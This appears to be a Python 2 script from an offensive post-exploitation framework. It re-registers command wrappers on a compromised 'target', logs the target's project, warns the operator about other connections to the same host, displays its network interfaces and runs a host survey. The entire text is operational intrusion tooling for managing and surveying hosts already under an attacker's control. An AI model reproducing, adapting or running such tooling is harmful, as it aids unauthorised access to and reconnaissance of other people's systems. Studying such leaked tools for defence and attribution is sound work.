
import dsz.script
import os.path
import ops
import ops.env
import ops.project
import ops.networking.ifconfig
import ops.survey
import ops.survey.ifconfig
import json
import dsz
dsz.control.echo.Off()
dsz.ui.Echo(('-' * 50))
dsz.ui.Echo('Re-registering global wrappers for current target')
dsz.ui.Echo(('-' * 50))
with open(os.path.join(dsz.lp.GetResourcesDirectory(), 'Ops', 'Data', 'wrappers.json'), 'r') as input:
    wrappers = json.load(input)
for wrapper in wrappers:
    dsz.cmd.Run(('wrappers -register %s -script %s -location current %s -project %s' % (wrapper['command'], wrapper['script'], ('-pre' if (('hook' not in wrapper.keys()) or (wrapper['hook'] == 'pre')) else '-post'), ('Ops' if ('project' not in wrapper.keys()) else wrapper['project']))))
    dsz.ui.Echo((wrapper['command'] if ('reason' not in wrapper.keys()) else ' - '.join([wrapper['command'], wrapper['reason']])))
dsz.ui.Echo(('-' * 50))
dsz.control.echo.On()
ops.project.getTargetID()
targ = ops.project.getTarget()
logpath = ops.env.get('_LOGPATH')
f = open(os.path.join(logpath, 'project.txt'), 'w')
f.write(targ.project.name)
f.close()
ops.info(('Target ID completed, ID %s (in project %s)' % (targ.target_id, targ.project.name)))
if ((targ.target_name is not None) and (targ.target_name != '')):
    ops.info(('Target name: %s' % targ.target_name))
actives = ops.project.getActiveCPAddresses(targ.target_id)
addrs = ops.project.getCPAddresses(targ.target_id)
if (len(actives) > 1):
    ops.warn('You are currently connected to this same target at the following CP addresses')
    for active in filter((lambda x: (x != dsz.script.Env['target_address'])), actives):
        print active
if (len(addrs) > 1):
    ops.warn('You have been on this target previously with the following CP addresses')
    for addr in filter((lambda x: (x != dsz.script.Env['target_address'])), addrs):
        print addr
print '===================================================================='
ops.info('Showing ifconfig data so you can make sure you are on the correct target')
ops.survey.ifconfig.main()
dsz.cmd.Run(('survey -run %s -sections env-setup -quiet' % ops.survey.DEFAULT_CONFIG))
survey = True
if (len(ops.project.getActiveCPAddresses()) > 1):
    print 
    dsz.ui.Echo('I detect multiple connections to the current target.')
    survey = (not dsz.ui.Prompt('Would you like to skip the survey entirely (including display of cached information)?'))
if survey:
    dsz.cmd.Run('survey -run')
ops.env.set('OPS_SIMPLE', True)